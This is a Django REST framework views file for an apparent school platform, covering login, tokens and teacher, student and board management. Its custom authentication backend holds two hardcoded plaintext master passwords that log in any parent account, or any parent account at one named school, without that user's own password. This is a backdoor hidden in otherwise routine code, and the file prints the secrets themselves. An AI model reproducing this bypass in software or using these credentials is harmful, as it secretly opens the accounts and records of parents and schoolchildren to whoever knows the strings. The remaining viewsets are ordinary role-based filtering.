# coding=utf-8
from django.contrib.auth import login as auth_login, logout as auth_logout
from django.contrib.auth.backends import ModelBackend
from rest_framework import mixins, parsers
from rest_framework import permissions
from rest_framework import viewsets
from rest_framework.views import APIView

from common.mixins import APIResponseMixin, TinyListModelMixin
from common.pagination import LimitOffsetPagination
from common.response import APIResponse
from user.models import UserProfile, AuthToken, Student, Teacher,Board
from user.permissions import WebAccess, BoardIndexViewSetPermissions
from user.serializers import WebAuthSerializer, StudentSerializer, \
    TeacherSerializer, BoardTokenSerializer, BoardListSerializer, UserProfileSerializer, \
    TinyTeacherSerializer, StudentUpdateSerializer, StudentCreateSerializer, BoardCreateSerializer, \
    BoardUpdateSerializer, BoardDetailSerializer, TeacherCreateSerializer, TeacherUpdateSerializer, \
    TeacherRetrieveSerializer
from user.filters import TeacherFilter, StudentFilter, BoardFilter
from user.permissions import TeacherViewSetPermissions,StudentViewPermissions


class AuthBackend(ModelBackend):
    def authenticate(self, username=None, password=None, **kwargs):
        try:
            user = UserProfile.objects.get(mobile=username)
            if password == 'YM88848400':
                sum = Student.objects.filter(parents__mobile=username).all().count()
                if sum > 0:
                    return user
            if password == 'QSGZ57100016':
                sum = Student.objects.filter(clazz__school__name='杭州求是高级中学', parents__mobile=username).all().count()
                if sum > 0:
                    return user
            if user.check_password(password):
                return user
        except Exception as e:
            return None


class BoardView(APIView):
    permission_classes = (permissions.AllowAny,)

    def post(self, request, *args, **kwargs):
        serializer = BoardTokenSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        user = serializer.validated_data['user']
        token, created = AuthToken.objects.get_or_create(user=user)
        if not created:
            token.refresh_key()
        return APIResponse({'token': token.key, 'expire': token.expire})

    def perform_authentication(self, request):
        request._not_authenticated()
        return request.user


class WebLoginView(APIView):
    permission_classes = (permissions.AllowAny,)

    def post(self, request, *args, **kwargs):
        serializer = WebAuthSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        user = serializer.validated_data['user']
        auth_login(request, user)
        return APIResponse()


class WebLogoutView(APIView):
    permission_classes = (permissions.AllowAny,)

    def post(self, request, *args, **kwargs):
        auth_logout(request)
        return APIResponse()


class UserProfileView(APIView):
    permission_classes = (WebAccess,)

    def get(self, request):
        return APIResponse(UserProfileSerializer(instance=request.user).data)


class TeacherViewSet(viewsets.GenericViewSet, mixins.ListModelMixin, mixins.CreateModelMixin,
                     mixins.RetrieveModelMixin, mixins.DestroyModelMixin, mixins.UpdateModelMixin,
                     TinyListModelMixin, APIResponseMixin):
    queryset = Teacher.objects.all()
    lookup_field = 'teacher_id'
    serializer_class = TeacherSerializer
    parser_classes = (parsers.JSONParser, parsers.MultiPartParser)
    filterset_class = TeacherFilter
    permission_classes = (TeacherViewSetPermissions,)
    search_fields = ('school__province', 'school__city', 'school__district')

    def get_queryset(self):
        if self.request.user.is_system_admin:
            return super().get_queryset()
        if self.request.user.is_school_admin or self.request.user.is_school_vic_admin:
            return super().get_queryset().filter(school=self.request.user.teacher.school)
        if self.request.user.is_electronicboard_admin:
            return super().get_queryset().filter(teacher_id=self.request.user.teacher.teacher_id)
        if self.request.user.is_teacher:
            return super().get_queryset().filter(teacher_id=self.request.user.teacher.teacher_id)

        return Teacher.objects.none()


    def get_serializer_class(self):
        if self.action == 'tiny_list':
            return TinyTeacherSerializer

        if self.action == 'create':
            return TeacherCreateSerializer

        if self.action == 'update':
            return TeacherUpdateSerializer

        if self.action == 'retrieve':
            return TeacherRetrieveSerializer

        return super().get_serializer_class()

    # def get_queryset(self):
    #     query = super().get_queryset()
    #     if self.request.user.is_school_admin:
    #         return query.filter(school=self.request.user.teacher.school)
    #     return query
    #
    # def create(self, request, *args, **kwargs):
    #     if self.request.user.is_school_admin:
    #         request.data['school'] = self.request.user.teacher.school.school_id
    #     return super().create(request, *args, **kwargs)
    #
    def update(self, request, *args, **kwargs):
        # if self.request.user.is_school_admin:
        #     request.data['school'] = self.request.user.teacher.school.school_id
        return super().update(request, *args, **kwargs)


class StudentView(viewsets.GenericViewSet, mixins.ListModelMixin, mixins.CreateModelMixin, mixins.DestroyModelMixin,
                  mixins.UpdateModelMixin, mixins.RetrieveModelMixin, APIResponseMixin):
    queryset = Student.objects.all()
    serializer_class = StudentSerializer
    permission_classes = (StudentViewPermissions,)
    lookup_field = 'student_id'
    filterset_class = StudentFilter
    search_fields = ('clazz__school__province','clazz__school__city','clazz__school__district')

    # def get_queryset(self):
    #     if self.request.user.is_system_admin:
    #         return super().get_queryset()
    #     if self.request.user.is_school_admin or self.request.user.is_school_vic_admin:
    #         return super().get_queryset().filter(school=self.request.user.teacher.school)
    #     if self.request.user.is_electronicboard_admin:
    #         return super().get_queryset().filter(class_id=self.request.user.teachers)
    #
    #     return Student.objects.none()

    def get_serializer_class(self):
        if self.action == 'update':
            return StudentUpdateSerializer

        if self.action == 'create':
            return StudentCreateSerializer

        return super().get_serializer_class()


class BoardIndexViewSet(viewsets.GenericViewSet,mixins.ListModelMixin,mixins.CreateModelMixin, mixins.RetrieveModelMixin,
                        mixins.UpdateModelMixin,mixins.DestroyModelMixin, APIResponseMixin):
    queryset = Board.objects.all()
    serializer_class = BoardListSerializer
    permission_classes = (BoardIndexViewSetPermissions,)
    pagination_class = LimitOffsetPagination
    lookup_field = 'board_id'
    filterset_class = BoardFilter
    search_fields = ('clazz__school__province', 'clazz__school__city', 'clazz__school__district', )

    def get_queryset(self):
        if self.request.user.is_system_admin:
            return super().get_queryset()
        if self.request.user.is_school_admin or self.request.user.is_school_vic_admin:
            return super().get_queryset().filter(school=self.request.user.teacher.school)

        if self.request.user.is_electronicboard_admin:
            return super().get_queryset().filter(board_id = self.request.user.teacher)

        return Board.objects.none()

    def get_serializer_class(self):

        if self.action == 'retrieve':
            return BoardDetailSerializer

        if self.action == 'create':
            return BoardCreateSerializer

        if  self.action == 'update':
            return BoardUpdateSerializer

        return super().get_serializer_class()



